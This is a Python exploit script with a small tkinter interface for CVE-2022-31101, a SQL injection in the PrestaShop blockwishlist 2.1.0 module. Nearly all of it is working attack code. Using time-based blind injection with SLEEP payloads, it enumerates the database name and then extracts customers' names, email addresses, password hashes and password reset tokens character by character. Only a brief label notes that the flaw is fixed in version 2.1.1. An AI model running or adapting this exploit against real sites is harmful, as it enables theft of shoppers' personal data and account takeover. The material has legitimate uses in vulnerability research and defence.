# Exploit Title: Prestashop blockwishlist module 2.1.0 - SQLi
# Date: 29/07/22
# Exploit Author: Karthik UJ (@5up3r541y4n)
# Vendor Homepage: https://www.prestashop.com/en
# Software Link (blockwishlist): https://github.com/PrestaShop/blockwishlist/releases/tag/v2.1.0
# Software Link (prestashop): https://hub.docker.com/r/prestashop/prestashop/
# Version (blockwishlist): 2.1.0
# Version (prestashop): 1.7.8.1
# Tested on: Linux
# CVE: CVE-2022-31101


# This exploit assumes that the website uses 'ps_' as prefix for the table names since it is the default prefix given by PrestaShop
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
import requests

root = tkinter.Tk()
root.title("CVE_2022_31101 sql exploits")
root.geometry('600x400+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack url : "+inp)
    url = inp
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)
    txtarea.insert(
            END, "Finding db name's length:")
    txtarea.pack(fill=BOTH, expand=1)
    header = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    }
    param = "?q=e30="
    staticStart = ")(select case when ("
    staticEnd = ") then (SELECT SLEEP(7)) else 1 end); -- .asc"
    charset = 'abcdefghijklmnopqrstuvwxyz1234567890_-@!#$%&\'*+/=?^`{|}~'
    charset = list(charset)
    emailCharset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-@!#$%&\'*+/=?^`{|}~.'
    emailCharset = list(emailCharset)
    for length in range(1, 65):
        condition = "LENGTH(database())=" + str(length)
        fullUrl = url + param + staticStart + condition + staticEnd

        try:
            req = requests.get(fullUrl, headers=header, timeout=8)
        except requests.exceptions.Timeout:
            dbLength=length
            txtarea.insert(END, "\nLength: ", length)
            print("\n")
            break
    txtarea.insert(
            END, "\nEnumerating current database name:\n")
    txtarea.insert(
            END, "\n--------------------------------------------------------------------\n")
    databaseName = ''
    for i in range(1, length+1):
        for char in charset:
            condition = "(SUBSTRING(database()," + str(i) + ",1)='" + char + "')"
            fullUrl = url + param + staticStart + condition + staticEnd

            try:
                req = requests.get(fullUrl, headers=header, timeout=8)
            except requests.exceptions.Timeout:
                txtarea.insert(END, char)
                databaseName += char
                break
    txtarea.insert(
            END, "--------------------------------------------------------------------\n")
    prefix = "ps_"
    tableName = prefix + "customer"
    staticStart = ")(select case when ("
    staticEnd1 = ") then (SELECT SLEEP(7)) else 1 end from " + tableName + " where id_customer="
    staticEnd2 = "); -- .asc"
    txtarea.insert(
            END, "\nEnumerating " + tableName + " table")

    for id in range(1, 10):
        condition = "id_customer=" + str(id)
        fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
        try:
            req = requests.get(fullUrl, headers=header, timeout=8)
            txtarea.insert(END, "\nOnly " + str(id - 1) + " records found. Exiting...")
            break
        except requests.exceptions.Timeout:
            pass
        txtarea.insert(
            END, "\nid = " + str(id))
        for length in range(0, 100):
            condition = "LENGTH(firstname)=" + str(length)
            fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
            try:
                req = requests.get(fullUrl, headers=header, timeout=8)
            except requests.exceptions.Timeout:
                firstnameLength=length
                txtarea.insert(END, "\nFirstname length: ", length)
                print()
                break
        txtarea.insert(
            END, "\nFirstname: ")
        firstname = ''
        for i in range(1, length+1):
            for char in charset:
                condition = "SUBSTRING(firstname," + str(i) + ",1)='" + char + "'"
                fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
                try:
                    req = requests.get(fullUrl, headers=header, timeout=8)
                except requests.exceptions.Timeout:
                    txtarea.insert(END, char)
                    firstname += char
                    break
        for length in range(1, 100):
            condition = "LENGTH(lastname)=" + str(length)
            fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
        
            try:
                req = requests.get(fullUrl, headers=header, timeout=8)
            except requests.exceptions.Timeout:
                lastnameLength=length
                txtarea.insert(END,"\nLastname length: ", length)
                break
        lastname = ''
        txtarea.insert(
            END, "\nLastname: ")
        for i in range(1, length+1):
            for char in charset:
                condition = "SUBSTRING(lastname," + str(i) + ",1)='" + char + "'"
                fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
                try:
                    req = requests.get(fullUrl, headers=header, timeout=8)
                except requests.exceptions.Timeout:
                    txtarea.insert(END, char)
                    firstname += char
                    break
        for length in range(1, 320):
            condition = "LENGTH(email)=" + str(length)
            fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
        
            try:
                req = requests.get(fullUrl, headers=header, timeout=8)
            except requests.exceptions.Timeout:
                emailLength=length
                txtarea.insert(
            END, "\nEmail length: ", length)
                break    
        email = ''
        txtarea.insert(
            END, "\nEmail: ")
        for i in range(1, length+1):
            for char in emailCharset:
                condition = "SUBSTRING(email," + str(i) + ",1)= BINARY '" + char + "'"
                fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2

                try:
                    req = requests.get(fullUrl, headers=header, timeout=8)
                    if req.status_code == 500 and char == '.':
                        txtarea.insert(END, char)
                        email += char
                except requests.exceptions.Timeout:
                    txtarea.insert(END, char)
                    email += char
                    break
        for length in range(1, 500):
             condition = "LENGTH(passwd)=" + str(length)
             fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
        
             try:
                 req = requests.get(fullUrl, headers=header, timeout=8)
             except requests.exceptions.Timeout:
                 passwordHashLength=length
                 txtarea.insert( END, "\nPassword hash length: ", length)
                 break    
        passwordHash = ''
        txtarea.insert( END, "\nPassword hash: ")
        for i in range(1, length+1):
            for char in emailCharset:
                condition = "SUBSTRING(passwd," + str(i) + ",1)= BINARY '" + char + "'"
                fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2

                try:
                    req = requests.get(fullUrl, headers=header, timeout=8)
                    if req.status_code == 500 and char == '.':
                        txtarea.insert(END, char)
                        passwordHash += char
                except requests.exceptions.Timeout:
                    txtarea.insert(END, char)
                    passwordHash += char
                    break
        for length in range(0, 500):
            condition = "LENGTH(reset_password_token)=" + str(length)
            fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
            try:
                req = requests.get(fullUrl, headers=header, timeout=8)
            except requests.exceptions.Timeout:
                passwordResetTokenLength=length
                txtarea.insert(END, "\nPassword reset token length: ", length)
                break    
        passwordResetToken = ''
        txtarea.insert(END, "\nPassword reset token: ")
        for i in range(1, length+1):
            for char in emailCharset:
                condition = "SUBSTRING(reset_password_token," + str(i) + ",1)= BINARY '" + char + "'"
                fullUrl = url + param + staticStart + condition + staticEnd1 + str(id) + staticEnd2
                try:
                    req = requests.get(fullUrl, headers=header, timeout=8)
                    if req.status_code == 500 and char == '.':
                        txtarea.insert(END, char)
                        passwordResetToken += char
                except requests.exceptions.Timeout:
                    txtarea.insert(END, char)
                    passwordResetToken += char
                    break
Hacher = Label(root, text="prestashop/blockwishlist is a prestashop extension which adds a block containing the \ncustomer's wishlists. In affected versions an authenticated customer can perform SQL injection.\n This issue is fixed in version 2.1.1. Users are advised to upgrade. \nThere are no known workarounds for this issue.\n").pack()  
Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
btn1 = Button(root, text = 'Quit !',command = root.destroy)
btn1.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()
